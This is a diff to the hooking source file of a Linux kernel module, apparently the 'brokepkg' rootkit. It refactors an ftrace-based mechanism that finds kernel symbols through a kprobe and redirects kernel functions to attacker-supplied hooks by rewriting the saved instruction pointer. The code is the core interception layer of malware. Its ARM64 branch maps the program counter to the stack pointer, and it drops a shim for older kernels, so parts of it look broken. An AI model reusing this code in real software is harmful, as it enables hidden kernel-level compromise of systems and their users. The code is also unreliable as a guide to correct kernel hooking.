@@ -1,5 +1,7 @@
 #include "hooks.h"
 
+#include "utils.h"
+
 /*
  * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
  * so we have to use kprobes to get the address.
@@ -10,15 +12,14 @@
 static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
 #endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
 #define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
 #endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
-#define ftrace_regs pt_regs
-static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs) {
-  return fregs;
-}
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+#define PC_REG_NAME ip
+#elif IS_ENABLED(CONFIG_ARM64)
+#define PC_REG_NAME sp
 #endif
 
 int fh_resolve_hook_address(struct ftrace_hook *hook) {
@@ -32,9 +33,7 @@ int fh_resolve_hook_address(struct ftrace_hook *hook) {
   hook->address = kallsyms_lookup_name(hook->name);
 
   if (!hook->address) {
-#ifdef DEBUG
-    printk(KERN_DEBUG "brokepkg: unresolved symbol: %s\n", hook->name);
-#endif
+    PR_DEBUG("brokepkg: unresolved symbol: %s\n", hook->name);
     return -ENOENT;
   }
 
@@ -48,15 +47,16 @@ int fh_resolve_hook_address(struct ftrace_hook *hook) {
 }
 
 void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-                             struct ftrace_ops *ops, struct ftrace_regs *fregs) {
+                             struct ftrace_ops *ops,
+                             struct ftrace_regs *fregs) {
   struct pt_regs *regs = ftrace_get_regs(fregs);
   struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
 
 #if USE_FENTRY_OFFSET
-  regs->ip = (unsigned long)hook->function;
+  regs->PC_REG_NAME = (unsigned long)hook->function;
 #else
   if (!within_module(parent_ip, THIS_MODULE))
-    regs->ip = (unsigned long)hook->function;
+    regs->PC_REG_NAME = (unsigned long)hook->function;
 #endif
 }
 
@@ -71,17 +71,13 @@ int fh_install_hook(struct ftrace_hook *hook) {
 
   err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
   if (err) {
-#ifdef DEBUG
-    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
-#endif
+    PR_DEBUG("brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
     return err;
   }
 
   err = register_ftrace_function(&hook->ops);
   if (err) {
-#ifdef DEBUG
-    printk(KERN_DEBUG "brokepkg: register_ftrace_function() failed: %d\n", err);
-#endif
+    PR_DEBUG("brokepkg: register_ftrace_function() failed: %d\n", err);
     return err;
   }
 
@@ -91,18 +87,13 @@ int fh_install_hook(struct ftrace_hook *hook) {
 void fh_remove_hook(struct ftrace_hook *hook) {
   int err;
   err = unregister_ftrace_function(&hook->ops);
-#ifdef DEBUG
   if (err) {
-    printk(KERN_DEBUG "brokepkg: unregister_ftrace_function() failed: %d\n",
-           err);
+    PR_DEBUG("brokepkg: unregister_ftrace_function() failed: %d\n", err);
   }
-#endif
 
   err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
   if (err) {
-#ifdef DEBUG
-    printk(KERN_DEBUG "brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
-#endif
+    PR_DEBUG("brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
   }
 }
 
